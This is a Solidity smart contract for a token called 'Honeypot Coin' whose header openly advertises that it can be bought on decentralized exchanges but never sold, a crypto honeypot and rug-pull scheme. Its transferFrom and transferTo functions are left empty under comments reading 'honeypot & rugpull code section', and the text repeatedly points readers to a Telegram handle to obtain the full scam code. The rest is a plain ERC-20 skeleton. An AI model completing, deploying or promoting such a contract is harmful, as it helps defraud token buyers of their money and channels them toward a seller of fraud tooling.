/**
 * Welcome to Honeypot Coin!
 *
 * This piece of code creates a token and simply makes it purchasable. 
 * This token can be listed and bought on decentralized exchanges (DEX) such as pancakeswap and uniswap, but it cannot be sold. 
 * Part of this code is written incompletely. Please contact me for the full code. telegram: t.me/Dexkundakcisi
 * 
 */

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract HoneypotCoin {
    string public name = "Honeypot Coin";
    string public symbol = "HON";
    uint256 public totalSupply = 1000000000 * 10 ** 18; // Total supply: 1,000,000,000 with 18 decimals
    uint8 public decimals = 18;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);


    constructor() {
        balanceOf[msg.sender] = totalSupply;
    }


    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(_to != address(0), "Invalid address");
        require(balanceOf[msg.sender] >= _value, "Insufficient balance");

        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(msg.sender, _to, _value);
        return true;
    }


    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }


    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        // honeypot & rugpull code section
        //Contact us for this section telegram: t.me/Dexkundakcisi

    }

 
    function transferTo(address _to, uint256 _value) public returns (bool success) {
        // honeypot & rugpull code section
        // Contact us for this section telegram: t.me/Dexkundakcisi
    }
}
